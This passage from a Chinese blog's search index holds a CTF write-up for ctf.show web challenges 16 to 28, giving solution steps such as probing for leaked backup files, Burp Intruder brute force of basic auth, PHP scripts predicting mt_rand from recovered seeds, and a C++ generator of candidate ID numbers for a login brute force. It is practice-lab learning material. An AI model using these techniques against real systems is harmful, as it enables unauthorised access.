id="题目描述">题目描述</h3><p><strong>对于测试用的<code>探针</code>，使用完毕后要及时删除，可能会造成信息泄露</strong></p><h3 id="解题思路">解题思路</h3><p>考察PHP探针php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡 流量、系统负载、服务器时间等信息。 url后缀名添加/tz.php 版本是雅黑PHP探针，然后查看phpinfo搜索flag</p><h2 id="17-web17">17.web17</h2><h3 id="题目描述">题目描述</h3><p><strong>备份的<code>sql文件</code>会泄露敏感信息</strong></p><h3 id="解题思路">解题思路</h3><p>根据提示备份的sql文件泄露敏感信息<br>常用访问backup.sql(或用dirsearch可以扫到)</p><h2 id="18-web18">18.web18</h2><h3 id="题目描述">题目描述</h3><p><strong>不要着急，休息，休息一会儿，玩101分给你flag</strong></p><h3 id="解题思路">解题思路</h3><p>是我喜欢(❤ ω ❤)的游戏题，玩到101分拿到flag，看这个速度和判定根本不可能<br>查看源代码发现是纯前端的JS脚本控制<br>找到flag的出现条件</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(score&gt;<span class="number">100</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">var</span> result=<span class="variable language_">window</span>.<span class="title function_">confirm</span>(<span class="string">&quot;GAMEOVER\n是否从新开始&quot;</span>);</span><br></pre></td></tr></table></figure><p>控制台运行<br><code>alert('\u4f60\u8d62\u4e86\uff0c\u53bb\u5e7a\u5e7a\u96f6\u70b9\u76ae\u7231\u5403\u76ae\u770b\u770b')</code><br>弹出提示框到/101.php拿到flag</p><h2 id="19-web19">19.web19</h2><h3 id="题目描述">题目描述</h3><p><strong>密钥什么的，就不要放在前端了</strong></p><h3 id="解题思路">解题思路</h3><p>查看源代码看到注释掉的js脚本（绕过前端直接提交密码哈希大大简化步骤）</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">$flag=<span class="string">&quot;fakeflag&quot;</span></span><br><span class="line">    $u = $_POST[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">    $p = $_POST[<span class="string">&#x27;pazzword&#x27;</span>];</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_">isset</span>($u) &amp;&amp; <span class="title function_">isset</span>($p))&#123;</span><br><span class="line">        <span class="keyword">if</span>($u===<span class="string">&#x27;admin&#x27;</span> &amp;&amp; $p ===<span class="string">&#x27;a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04&#x27;</span>)&#123;</span><br><span class="line">            echo $flag;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>hackbar以POST形式传入u和p以获得flag<br><code>username=admin&amp;pazzword=a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04</code></p><p><strong>未简化版本</strong><br>若隐藏以上JS脚本，我们已知AES加密函数，密文，密钥，偏移量，可解码获得明文<br><s>密码学会不了一点</s><br>直接使用<a href="http://tool.chacuo.net/cryptaes">解密网站</a><br>加密模式：CBC     填充：zeropadding  密钥：0000000372619038<br>偏移量：ilove36dverymuch  输出：hex  字符集：UTF-8<br>密文：a599ac85a73384ee3219fa684296eaa62667238d608efa81837030bd1ce1bf04<br>解出密码：i_want_a_36d_girl 直接登录即可（楽）</p><h2 id="20-web20">20.web20</h2><h3 id="题目描述">题目描述</h3><p><strong>mdb文件是早期asp+access构架的数据库文件，文件泄露相当于数据库被脱裤</strong></p><h3 id="解题思路">解题思路</h3><p>打开靶机发现提示asp程序，access数据库<br>mdb文件是早期asp+access构架的数据库文件 直接查看url路径添加/db/db.mdb<br>下载文件通过txt打开或者通过EasyAccess.exe打开搜索flag<br>或使用diesearch扫描到/db目录，进一步扫描也可发现/db/db.mdb文件</p><hr><h1>爆破</h1><h2 id="21-web21">21.web21</h2><h3 id="题目描述">题目描述</h3><p><strong>爆破什么的，都是基操</strong></p><h3 id="解题思路">解题思路</h3><p>本题给出密码本，BP抓包发现采用basic认证，发送到Intruder准备爆破<br>先确定变量位置，发现采用了base64编码<br>设置payload，加载密码本，设置前缀（Prefix）为admin:<br>采用base64-encode<br>注意顺序并取消特殊符号的编码<br>开始爆破找到状态码为200的即为成功，发包得到flag</p><h2 id="22-web22">22.web22</h2><h3 id="题目描述">题目描述</h3><p><strong>域名也可以爆破的，试试爆破这个ctf.show的子域名</strong></p><h3 id="解题思路">解题思路</h3><p>原题中flag所在的子域名应该已经失效<br>主要理解搜集子域名的意义<br>推荐一个<a href="https://scan.javasec.cn/">子域名爆破网站</a></p><h2 id="23-web23">23.web23</h2><h3 id="题目描述">题目描述</h3><p><strong>还爆破？这么多代码，告辞！</strong></p><h3 id="解题思路">解题思路</h3><p>代码审计，直接编写PHP脚本得到token值，源码中php可以直接使用</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span>&lt;<span class="number">10000</span>;<span class="variable">$i</span>++)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="variable">$token</span>=<span class="title function_ invoke__">md5</span>(<span class="variable">$i</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) &amp;&amp; <span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>) ===<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>((<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>))+<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">14</span>,<span class="number">1</span>))+<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">17</span>,<span class="number">1</span>))/<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">1</span>,<span class="number">1</span>)===<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$token</span>, <span class="number">31</span>,<span class="number">1</span>)))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&#x27;$i= &#x27;</span>,<span class="variable">$i</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">#$i= 422</span></span><br><span class="line"><span class="comment">#$i= 1202</span></span><br></pre></td></tr></table></figure><p>GET方式传入token得到flag</p><h2 id="24-web24">24.web24</h2><h3 id="题目描述">题目描述</h3><p><strong>爆个🔨</strong></p><h3 id="解题思路">解题思路</h3><p>代码审计，发现用PHP随机数生成函数且种子固定<br>因此生成的伪随机数固定<br>编写php脚本(注意token错误可能是因为php版本问题)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">372619038</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line"></span><br><span class="line"><span class="comment">#1155388967</span></span><br></pre></td></tr></table></figure><h2 id="25-web25">25.web25</h2><h3 id="题目描述">题目描述</h3><p><strong>爆个🔨，不爆了</strong></p><h3 id="解题思路">解题思路</h3><p>这题需要看懂逻辑(终于有个有意思的了)，先分析以下源码</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>]))&#123;</span><br><span class="line">    <span class="variable">$r</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;r&#x27;</span>];</span><br><span class="line">    <span class="title function_ invoke__">mt_srand</span>(<span class="title function_ invoke__">hexdec</span>(<span class="title function_ invoke__">substr</span>(<span class="title function_ invoke__">md5</span>(<span class="variable">$flag</span>), <span class="number">0</span>,<span class="number">8</span>)));</span><br><span class="line">    <span class="variable">$rand</span> = <span class="title function_ invoke__">intval</span>(<span class="variable">$r</span>)-<span class="title function_ invoke__">intval</span>(<span class="title function_ invoke__">mt_rand</span>());</span><br><span class="line">    <span class="keyword">if</span>((!<span class="variable">$rand</span>))&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$_COOKIE</span>[<span class="string">&#x27;token&#x27;</span>]==(<span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>()))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="variable">$rand</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><code>$rand = intval($r)-intval(mt_rand());</code>当传入r=0时，可输出生成第一个随机数的负值（因flag随机生成，随机数每次不同）<br>接下来我们要用生成的第一个随机数反推随机数种子<a href="https://www.openwall.com/php_mt_seed/php_mt_seed-4.0.tar.gz">随机数种子反推工具</a><br><img src="https://img1.imgtp.com/2023/07/18/39RWHP7H.png" alt="在kali上编译并运行工具"><br>得到随机数种子（不同php版本有差异）<br>接下来编写php脚本验证种子正确性并得到第二、三个随机数之和</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">0x04a34661</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;  &#x27;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">mt_rand</span>()+<span class="title function_ invoke__">mt_rand</span>();</span><br><span class="line"></span><br><span class="line"><span class="comment">#2085542740  2190553804</span></span><br></pre></td></tr></table></figure><p>搞定！payload:?r=2085542740 cookie:token=2190553804</p><h2 id="26-web26">26.web26</h2><h3 id="题目描述">题目描述</h3><p><strong>这个可以爆</strong></p><h3 id="解题思路">解题思路</h3><p>由于出题人底层代码错误，直接连接也可链接到数据库<br>抓包放包可获得flag<br>也可像web21一样爆破，不再赘述</p><h2 id="27-web27">27.web27</h2><h3 id="题目描述">题目描述</h3><p><strong>CTFshow菜鸡学院招生啦！</strong></p><h3 id="解题思路">解题思路</h3><p>该题为一个教务管理系统，但是并不知道学生的学号和密码<br>但下方给出了录取名单 身份证621022********5237中有八位被遮挡<br>思路清晰，要爆破可用的身份证<br>这里要会写身份证检验的脚本，能大大减少爆破的数据量</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">bool</span> <span class="title">checkCard</span><span class="params">(<span class="type">int</span> ID[<span class="number">18</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> list[] = &#123; <span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">6</span>,<span class="number">3</span>,<span class="number">7</span>,<span class="number">9</span>,<span class="number">10</span>,<span class="number">5</span>,<span class="number">8</span>,<span class="number">4</span>,<span class="number">2</span> &#125;;</span><br><span class="line"><span class="type">int</span> src[] = &#123; <span class="number">1</span>,<span class="number">0</span>,<span class="number">10</span>,<span class="number">9</span>,<span class="number">8</span>,<span class="number">7</span>,<span class="number">6</span>,<span class="number">5</span>,<span class="number">4</span>,<span class="number">3</span>,<span class="number">2</span> &#125;;</span><br><span class="line"><span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">17</span>; i++)</span><br><span class="line">&#123;</span><br><span class="line">sum += list[i] * ID[i];</span><br><span class="line">&#125;</span><br><span class="line">sum = sum % <span class="number">11</span>;</span><br><span class="line"><span class="keyword">if</span> (src[sum] == ID[<span class="number">17</span>]) <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="type">int</span> id[<span class="number">18</span>] = &#123; <span class="number">6</span>,<span class="number">2</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">2</span>,<span class="number">2</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">0</span>,<span class="number">5</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">7</span> &#125;;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> y = <span class="number">1990</span>; y &lt; <span class="number">2024</span>; y++)</span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">6</span>] = y / <span class="number">1000</span>;</span><br><span class="line">id[<span class="number">7</span>] = y / <span class="number">100</span> % <span class="number">10</span>;</span><br><span class="line">id[<span class="number">8</span>] = y / <span class="number">10</span> % <span class="number">10</span>;</span><br><span class="line">id[<span class="number">9</span>] = y % <span class="number">10</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> m = <span class="number">1</span>; m &lt; <span class="number">13</span>; m++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">if</span> (m &lt; <span class="number">10</span>)</span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">10</span>] = <span class="number">0</span>;</span><br><span class="line">id[<span class="number">11</span>] = m;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">10</span>] = <span class="number">1</span>;</span><br><span class="line">id[<span class="number">11</span>] = m % <span class="number">10</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> d = <span class="number">1</span>; d &lt; <span class="number">31</span>; d++)</span><br><span class="line">&#123;</span><br><span class="line">id[<span class="number">12</span>] = d / <span class="number">10</span>;</span><br><span class="line">id[<span class="number">13</span>] = d % <span class="number">10</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">checkCard</span>(id))</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">18</span>; i++)</span><br><span class="line">cout &lt;&lt; id[i];</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可用数据大概有一千多条，抓包爆破找到反常长度的返回即可获得flag</p><h2 id="28-web28">28.web28</h2><h3 id="题目描述">题目描述</h3><p><strong>大海捞针</strong></p><h3 id="解题思路">解题思路</h3><p>进去发现毫无提示，真是大海捞针<br>不过既然原域名发生重定向到/0/1/2.txt，又属于爆破题（注意爆破时要将2.txt改为默认文件index.php）<br>可以想到BP抓包爆破域名<br>/0~100/0~100<br>爆破后在/72/10/index.php返回状态码200<br>拿到flag</p><hr>]]></content>
      
      
      <categories>
          
          <category> WriteUp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> 爆破 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>更新日志&amp;md语法演示</title>
      <link href="/2023/07/09/demo/"/>
      <url>/2023/07/09/demo/</url>
      
        <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="抱歉, 这个密码看着不太对, 请再试试." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="cc9117bd8f9b7be5f96ce664a1a92d11cdde2906ad3194213f5ce4cd9f5e0eab"></script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">这里需要密码才能访问</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Markdown </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
